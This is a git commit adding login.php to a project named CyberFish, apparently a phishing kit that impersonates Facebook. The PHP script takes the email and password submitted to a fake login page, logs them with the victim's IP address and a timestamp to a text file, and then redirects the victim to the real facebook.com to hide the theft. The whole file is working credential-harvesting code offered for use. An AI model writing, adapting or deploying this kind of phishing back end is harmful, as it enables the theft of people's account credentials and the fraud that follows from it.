355237135223585cc4fddd79c914135b612bf4ff
Cyber_Root0 <70926805+Cyber-Root0@users.noreply.github.com>
2021-01-12 21:55:49 -0300

    Add files via upload

---
+++ CyberFish/Facebook/login.php
@@ -0,0 +1,28 @@
+﻿<?php
+
+$ip = $_SERVER["REMOTE_ADDR"]."\r\n";
+$hora = date("Y-m-d  #  H:i:s")."\r\n";
+$email=$_POST['email']."\r\n";
+$senha=$_POST['password']."\r\n";
+
+$traco="==============FACEBOOK==============="."\r\n";
+$seuip="IP: ";
+$seuhora="HORA: ";
+$seuemail="EMAIL: ";
+$seusenha="SENHA: ";
+
+$file = fopen("dados.txt","a");
+$escrever0=fwrite($file, $traco);
+$escrever1=fwrite($file, $seuip);
+$escrever2=fwrite($file, $ip);
+$escrever3=fwrite($file, $seuhora);
+$escrever4=fwrite($file, $hora);
+$escrever5=fwrite($file, $seuemail);
+$escrever6=fwrite($file, $email);
+$escrever7=fwrite($file, $seusenha);
+$escrever8=fwrite($file, $senha);
+fclose($file);
+?>
+<script language="JavaScript"> 
+window.location="https://facebook.com"; 
+</script> 
